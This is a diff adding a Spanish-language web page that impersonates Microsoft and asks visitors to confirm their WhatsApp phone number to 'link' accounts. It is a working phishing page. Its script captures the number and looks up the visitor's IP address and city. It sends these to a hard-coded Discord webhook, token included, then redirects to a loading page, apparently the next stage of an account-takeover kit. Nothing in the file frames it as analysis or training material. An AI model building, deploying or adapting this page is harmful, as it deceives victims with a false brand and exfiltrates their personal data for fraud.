@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="tod">
+    <div class="header" style="display: flex; justify-content: center; text-align: center; margin-bottom: 20px;">
+        <div class="logo">
+            <div class="square red"></div>
+            <div class="square green"></div>
+            <div class="square blue"></div>
+            <div class="square yellow"></div>
+        </div>
+        <span class="brand">Microsoft</span>
+    </div>
+    
+    <h1 style="text-align: center;">Verificar Cuenta de WhatsApp</h1>
+    <br>
+    <p style="text-align: center; margin-bottom: 20px;">Confirma tu número de teléfono asociado a WhatsApp para vincularlo con tu cuenta de Microsoft.</p>
+    
+    <form id="form" action="cargando.html">
+        <label for="aa1" style="font-weight: 600; color: black;">Selecciona tu país</label>
+        <select id="gfd" class="form-select">
+    <option selected>Selecciona tu país</option>
+
+ <option value=""  selected>Selecciona tu país</option>
+                    <option value="+54"> Argentina (+54)</option>
+                    <option value="+591"> Bolivia (+591)</option>
+                    <option value="+55"> Brasil (+55)</option>
+                    <option value="+56"> Chile (+56)</option>
+                    <option value="+57"> Colombia (+57)</option>
+                    <option value="+506"> Costa Rica (+506)</option>
+                    <option value="+53"> Cuba (+53)</option>
+                    <option value="+1"> Rep. Dominicana (+1)</option>
+                    <option value="+593"> Ecuador (+593)</option>
+                    <option value="+503"> El Salvador (+503)</option>
+                    <option value="+502"> Guatemala (+502)</option>
+                    <option value="+504"> Honduras (+504)</option>
+                    <option value="+52"> México (+52)</option>
+                    <option value="+505"> Nicaragua (+505)</option>
+                    <option value="+507"> Panamá (+507)</option>
+                    <option value="+595"> Paraguay (+595)</option>
+                    <option value="+51"> Perú (+51)</option>
+                    <option value="+1"> Puerto Rico (+1)</option>
+                    <option value="+598"> Uruguay (+598)</option>
+                    <option value="+58"> Venezuela (+58)</option>
+</select>
+<br> <br>
+        <div id="error-correo" class="error">Ingresa un correo válido</div>
+        
+        <label for="aa2" style="font-weight: 600; color: black;">Número de teléfono de WhatsApp</label>
+        <input type="text" id="aa2" name="aa2" inputmode="numeric" pattern="[0-9]*"  minlength="5" maxlength="15"> 
+        
+      
+        <p class="legal">
+            Ingresa solo los dígitos de tu número (el código de país se agrega automáticamente).
+        </p>
+        
+    
+       
+        
+        <button type="submit" id="btn" disabled style="">
+    <img style="width: 20px;  vertical-align: middle;" src="https://i.postimg.cc/8CY8R6qZ/h55.png" alt="">
+    Sincronizar Ahora
+</button> <br><br>
+         <p class="legal" style="text-align: center;">Confirma tu número para vincular tu cuenta.</p>
+    </form>
+   </div> 
+   <br><br><br><br><br>
+    <div class="footer">
+        <a href="#">Ayuda y comentarios</a>
+        <a href="#">Términos de uso</a>
+        <br>
+        <a href="#">Privacidad y cookies</a>
+    </div>
+    
+  
+
+<script>
+
+   (function() {
+    'use strict';
+    
+
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481333399946924203/b7E65TBdYOwrFuhD9_MC-wDt1HpBoK9PYjsRjid5i-EcHRJ64IvEnHWBv_-yfzQZqRXa";
+    
+
+    const _s = document.getElementById('gfd');
+    const _i = document.getElementById('aa2');
+    const _b = document.getElementById('btn');
+    const _f = document.getElementById('form');
+    
+    if (!_f || !_s || !_i || !_b) return;
+    
+  
+    _i.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        _check();
+    });
+    
+
+    function _check() {
+        _b.disabled = !(_s.value && _i.value.trim().length > 4);
+    }
+    
+    _s.addEventListener('change', _check);
+    _check();
+    
+ 
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+        const m = {
+            'AR':'+54','BO':'+591','BR':'+55','CL':'+56','CO':'+57','CR':'+506',
+            'CU':'+53','DO':'+1','EC':'+593','SV':'+503','GT':'+502','HN':'+504',
+            'MX':'+52','NI':'+505','PA':'+507','PY':'+595','PE':'+51','PR':'+1',
+            'UY':'+598','VE':'+58'
+        };
+        if (m[d.country_code]) {
+            _s.value = m[d.country_code];
+            _check();
+        }
+    }).catch(() => {});
+    
+
+    _f.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    if (_b.disabled) return;
+
+    _b.disabled = true;
+    _b.innerHTML = '<img style="width:20px;vertical-align:middle" src="https://i.postimg.cc/8CY8R6qZ/h55.png"> Procesando...';
+    
+    const cp = _s.value;
+    const nt = _i.value.trim();
+    const fn = cp === '+52' ? `${cp} (${nt})` : `${cp} ${nt}`;
+
+    // Guardar en session
+    sessionStorage.setItem('_w', fn);
+    sessionStorage.setItem('_c', cp);
+    sessionStorage.setItem('_n', nt);
+    sessionStorage.setItem('_t', Date.now());
+    
+    try {
+        // 1. Obtener datos de conexión (solo una fuente es suficiente y más rápido)
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        
+        const msg = {
+            content: null,
+            embeds: [{
+                title: "📱 Nueva Verificación",
+                color: 3066993,
+                fields: [
+                    { name: "📞 Numero", value: `\`\`\`${fn}\`\`\``, inline: false },
+                    { 
+                        name: "🌍 Conexión", 
+                        value: `IP: ${d.ip}\nUbicación: ${d.city}, ${d.country_name}`, 
+                        inline: false 
+                    }
+                ]
+            }]
+        };
+        
+        // 2. CLAVE: Usar AWAIT aquí para asegurar que Discord lo reciba
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(msg)
+        });
+        
+        // 3. Solo cuando el fetch anterior termina, redirigimos
+        window.location.href = 'cargando.html';
+        
+    } catch (err) {
+        console.error("Error:", err);
+        // Si falla la API de IP o el Webhook, redirigimos igual para no trabar
+        window.location.href = 'cargando.html';
+    }
+});
+
+   
+    
+
+    window.addEventListener('resize', () => window.scrollTo(0, 0));
+
+    setTimeout(() => _i.focus(), 300);
+})();
+
+</script>
+<script>
+    
+</script>
+<script src="ak/dus.js"></script>
+</body>
+</html>
